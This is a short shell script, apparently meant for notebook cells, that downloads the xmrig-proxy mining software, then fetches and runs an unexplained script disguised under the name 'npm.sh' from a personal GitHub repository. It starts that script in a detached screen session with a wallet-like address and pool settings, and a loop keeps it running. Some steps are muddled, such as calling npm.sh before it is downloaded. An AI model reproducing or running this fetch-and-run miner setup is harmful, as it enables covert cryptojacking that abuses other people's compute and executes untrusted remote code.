#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz
tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz
cd xmrig-proxy-6.14.0 && screen -dmS run !./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.PX.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -d 0 0.0.0.0:3333 -m simple


!wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/npm.sh
!chmod +x npm.sh
!./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.PX.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -d 0 0.0.0.0:3333 -m simple
while [ 1 ]; do
sleep 3
done
sleep 999
